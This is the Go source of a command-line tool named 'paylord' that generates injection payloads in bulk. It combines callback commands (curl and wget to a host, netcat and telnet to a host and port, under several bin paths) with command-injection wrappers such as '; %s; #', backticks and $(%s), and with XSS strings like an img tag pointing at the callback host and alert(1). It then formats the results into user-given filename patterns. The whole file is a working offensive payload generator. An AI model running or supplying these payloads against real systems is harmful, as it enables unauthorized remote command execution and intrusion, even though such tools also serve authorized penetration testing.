package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

// RootCmd represents the base command when called without any subcommands
var RootCmd = &cobra.Command{
	Use:   "paylord",
	Short: "paylord is a is like crunch but for payloads",
	Long:  `paylord is a is like crunch but for payloads`,
	Run: func(cmd *cobra.Command, args []string) {

		patterns, _ := cmd.Flags().GetStringSlice("pattern")
		host, _ := cmd.Flags().GetString("host")
		tcpListenerPort, _ := cmd.Flags().GetInt("tcp-port")

		commands := []string{}

		binPaths := []string{
			"/usr/bin/",
			"/usr/local/bin/",
			"/usr/local/sbin/",
			"/sbin/",
			"/bin/",
		}

		webList := []string{
			"curl",
			"wget",
		}

		for _, command := range webList {
			commands = append(commands, fmt.Sprintf("%s %s", command, host))
			for _, binPath := range binPaths {
				commands = append(commands, fmt.Sprintf("%s%s %s", binPath, command, host))
			}
		}

		tcpList := []string{
			"netcat",
			"telnet",
		}

		for _, command := range tcpList {
			commands = append(commands, fmt.Sprintf("%s %s %d", command, host, tcpListenerPort))

			for _, binPath := range binPaths {
				commands = append(commands, fmt.Sprintf("%s%s %s %d", binPath, command, host, tcpListenerPort))
			}
		}

		injectionPatterns := []string{
			// RCE
			`"; %s; #`,
			`'; %s; #`,
			`"| %s; #`,
			`'| %s; #`,
			`"&& %s ;#`,
			`'&& %s ;#`,
			`"&& %s &#`,
			`'&& %s &#`,
			`"|| echo ; %s; echo "`,
			`'|| echo ; %s; echo "`,
			`'; %s ; echo '`,
			`"| %s ; echo "`,
			`'| %s ; echo ;`,
			`" %s ; #`,
			`'|| %s; #`,
			"`%s`",
			"$(%s)",

			// XSS
			`'"><img src=%s/l/ />`,
			`';alert(1);`,
			`";alert(1);`,
		}

		injected := []string{}
		for _, injectionPatterns := range injectionPatterns {
			for _, command := range commands {
				injected = append(injected, fmt.Sprintf(injectionPatterns, command))
			}
		}

		outputPatterns := []string{}

		for _, pattern := range patterns {
			for _, injected := range injected {
				outputPatterns = append(outputPatterns, fmt.Sprintf(pattern, injected))
			}

		}

		for _, pattern := range outputPatterns {
			fmt.Println(fmt.Sprintf(pattern))
		}
	},
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	err := RootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	RootCmd.PersistentFlags().StringArrayP("pattern", "p", []string{"%s"}, "Patterns. default: [%s] ex: test-%s.pdf)")
	RootCmd.PersistentFlags().StringP("host", "h", "", "Callback host.")
	RootCmd.PersistentFlags().IntP("tcp-port", "t", 9090, "Callback port.")
}
